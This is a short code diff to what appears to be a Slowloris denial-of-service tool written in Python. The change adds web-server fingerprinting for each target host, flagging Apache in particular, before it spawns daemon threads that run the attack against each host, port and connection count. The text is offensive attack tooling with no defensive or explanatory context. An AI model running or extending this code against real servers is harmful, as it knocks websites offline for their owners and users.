@@ -7,7 +7,7 @@ import threading
 import time
 
 # Library imports
-from slow_loris import SlowLoris
+from slow_loris import *
 
 # Constants
 DEFAULT_PORT = 80
@@ -49,9 +49,16 @@ def main():
         # Spawn a new daemon thread for each attacker,
         # as it takes time to establish all the connections.
         for target in targets:
+            host, port, count = target
+            web_server = try_detect_webserver(host, port)
+            if web_server != None:
+                if web_server.startswith("Apache"):
+                    print("Target {} is running Apache.".format(host))
+                else:
+                    print("Target {} is running {}.".format(host, web_server))
             attack_thread = threading.Thread(
                 target=loris.attack,
-                args=[target[0], target[1], target[2]])
+                args=[host, port, count])
             attack_thread.setDaemon(True)
             attack_thread.start()
             time.sleep(0.5)
